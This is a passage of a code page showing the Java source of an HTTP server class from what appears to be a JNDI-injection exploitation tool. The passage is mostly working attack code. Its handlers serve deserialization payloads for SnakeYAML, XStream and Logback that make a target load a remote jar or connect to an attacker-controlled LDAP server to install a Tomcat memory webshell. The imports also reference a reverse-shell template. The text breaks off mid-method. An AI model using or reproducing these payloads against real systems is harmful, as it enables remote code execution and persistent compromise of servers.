class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.feihong.ldap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.io.file.FileReader;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.CommandTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.DnslogTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.template.ReverseShellTemplate;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Cache;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Config;</span><br><span class="line"><span class="keyword">import</span> com.feihong.ldap.utils.Util;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpExchange;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.HttpServer;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.reflect.FieldUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarFile;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HTTPServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">cwd</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpServer</span> <span class="variable">httpServer</span> <span class="operator">=</span> HttpServer.create(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(Config.httpPort), <span class="number">0</span>);</span><br><span class="line">        httpServer.createContext(<span class="string">&quot;/&quot;</span>, <span class="keyword">new</span> <span class="title class_">HttpHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">(HttpExchange httpExchange)</span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;[+] New HTTP Request From &quot;</span> + httpExchange.getRemoteAddress() + <span class="string">&quot;  &quot;</span> + httpExchange.getRequestURI());</span><br><span class="line"></span><br><span class="line">                    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> httpExchange.getRequestURI().getPath();</span><br><span class="line">                    <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.class&quot;</span>))&#123;</span><br><span class="line">                        handleClassRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.wsdl&quot;</span>))&#123;</span><br><span class="line">                        handleWSDLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.jar&quot;</span>))&#123;</span><br><span class="line">                        handleJarRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.startsWith(<span class="string">&quot;/xxelog&quot;</span>))&#123;</span><br><span class="line">                        handleXXELogRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.sql&quot;</span>))&#123;</span><br><span class="line">                        handleSQLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (path.endsWith(<span class="string">&quot;.groovy&quot;</span>))&#123;</span><br><span class="line">                        handlerGroovyRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.xml&quot;</span>)) &#123;</span><br><span class="line">                        handleXMLRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.txt&quot;</span>)) &#123;</span><br><span class="line">                        handleTXTRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(path.endsWith(<span class="string">&quot;.yml&quot;</span>))&#123;</span><br><span class="line">                        handleYmlRequest(httpExchange);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        handleFileRequest(httpExchange);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        httpServer.setExecutor(<span class="literal">null</span>);</span><br><span class="line">        httpServer.start();</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] HTTP Server Start Listening on &quot;</span> + Config.httpPort + <span class="string">&quot;...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleFileRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span>  cwd + File.separator + <span class="string">&quot;data&quot;</span> + File.separator +path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filename);</span><br><span class="line">        <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            fileInputStream.read(bytes);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleYmlRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line"><span class="comment">//        String host = exchange.getRequestURI().getHost();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">YamlName</span> <span class="operator">=</span>  path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    !!java.net.URL [\&quot;http://&quot;</span>+ Config.ip +<span class="string">&quot;:&quot;</span>+ Config.httpPort + <span class="string">&quot;/behinder3.jar\&quot;]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  ]]\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]\n&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  dataSourceName: \&quot;ldap://127.0.0.1:1389/basic/TomcatMemShell3\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  autoCommit: true&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (YamlName.equalsIgnoreCase(<span class="string">&quot;snake&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"><span class="comment">//            exchange.getResponseHeaders().set(&quot;Content-type&quot;,&quot;application/octet-stream&quot;);</span></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line"><span class="comment">//            exchange.sendResponseHeaders(200, yaml.getBytes().length + 1);</span></span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"><span class="comment">//            exchange.getResponseBody().write(yaml.getBytes(&quot;UTF-8&quot;));</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + YamlName + <span class="string">&quot;.yml&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleTXTRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">txtname</span> <span class="operator">=</span>  path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (txtname.equalsIgnoreCase(<span class="string">&quot;isok&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="string">&quot;success!&quot;</span>.getBytes();</span><br><span class="line">            exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + txtname + <span class="string">&quot;.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line"></span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                &#125;</span><br><span class="line">                exchange.getResponseHeaders().set(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">200</span>, file.length() + <span class="number">1</span>);</span><br><span class="line">                exchange.getResponseBody().write(bytes1);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;[!] Response Code: &quot;</span> + <span class="number">404</span>);</span><br><span class="line">                exchange.sendResponseHeaders(<span class="number">404</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        exchange.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">handleXMLRequest</span><span class="params">(HttpExchange exchange)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> exchange.getRequestURI().getPath();</span><br><span class="line"><span class="comment">//        String host = exchange.getRequestURI().getHost();</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xmlName</span> <span class="operator">=</span> path.substring(path.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>, path.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="string">&quot;&lt;configuration&gt;\n  &lt;insertFromJNDI env-entry-name=\&quot;ldap://&quot;</span> + Config.ip + <span class="string">&quot;:&quot;</span>+ Config.ldapPort + <span class="string">&quot;/TomcatBypass/TomcatMemshell3\&quot; as=\&quot;appName\&quot; /&gt;\n&lt;/configuration&gt;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="string">&quot;&lt;linked-hash-set&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;flags&gt;0&lt;/flags&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;value class=\&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;dataHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;dataSource class=\&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;is class=\&quot;javax.crypto.CipherInputStream\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;cipher class=\&quot;javax.crypto.NullCipher\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;initialized&gt;false&lt;/initialized&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;opmode&gt;0&lt;/opmode&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;serviceIterator class=\&quot;javax.imageio.spi.FilterIterator\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;iter class=\&quot;javax.imageio.spi.FilterIterator\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;iter class=\&quot;java.util.Collections$EmptyIterator\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;next class=\&quot;com.sun.rowset.JdbcRowSetImpl\&quot; serialization=\&quot;custom\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;concurrency&gt;1008&lt;/concurrency&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;fetchSize&gt;0&lt;/fetchSize&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;isolation&gt;2&lt;/isolation&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;maxRows&gt;0&lt;/maxRows&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;readOnly&gt;true&lt;/readOnly&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;showDeleted&gt;false&lt;/showDeleted&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;dataSource&gt;ldap://&quot;</span> + Config.ip + <span class="string">&quot;:1389/basic/TomcatMemShell3&lt;/dataSource&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;listeners/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;params/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;/javax.sql.rowset.BaseRowSet&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;iMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;int&gt;-1&lt;/int&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/iMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;strMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                            &lt;null/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                          &lt;/strMatchColumns&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                        &lt;/default&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;/next&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;/iter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;filter class=\&quot;javax.imageio.ImageIO$ContainsFilter\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;name&gt;getDatabaseMetaData&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                      &lt;parameter-types/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;/method&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    &lt;name&gt;foo&lt;/name&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;/filter&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                  &lt;next class=\&quot;string\&quot;&gt;foo&lt;/next&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;/serviceIterator&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &lt;lock/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;/cipher&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;input class=\&quot;java.lang.ProcessBuilder$NullInputStream\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ibuffer&gt;&lt;/ibuffer&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;done&gt;false&lt;/done&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ostart&gt;0&lt;/ostart&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;ofinish&gt;0&lt;/ofinish&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;              &lt;closed&gt;false&lt;/closed&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;/is&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &lt;consumed&gt;false&lt;/consumed&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;/dataSource&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;          &lt;transferFlavors/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;/dataHandler&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;dataLen&gt;0&lt;/dataLen&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;      &lt;/value&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;/jdk.nashorn.internal.objects.NativeString&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../../entry/jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;jdk.nashorn.internal.objects.NativeString reference=\&quot;../../entry/jdk.nashorn.internal.objects.NativeString\&quot;/&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  &lt;/entry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/linked-hash-set&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(xmlName.equals(<span class="string">&quot;a&quot;</span>)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, bytes.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (xmlName.equals(<span class="string">&quot;x&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Response Code: &quot;</span> + <span class="number">200</span>);</span><br><span class="line">            exchange.getResponseHeaders().add(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/xml; charset=utf-8&quot;</span>);</span><br><span class="line">            exchange.sendResponseHeaders(<span class="number">200</span>, xstream.getBytes().length + <span class="number">1</span>);</span><br><span class="line">            exchange.getResponseBody().write(xstream.getBytes(StandardCharsets.UTF_8));</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">pa</span> <span class="operator">=</span> cwd + File.separator + <span class="string">&quot;data&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pa + File.separator + xmlName + <span class="string">&quot;.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (file.exists())&#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes1 = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                    fileInputStream.read(bytes1);</span><br><span class="line">                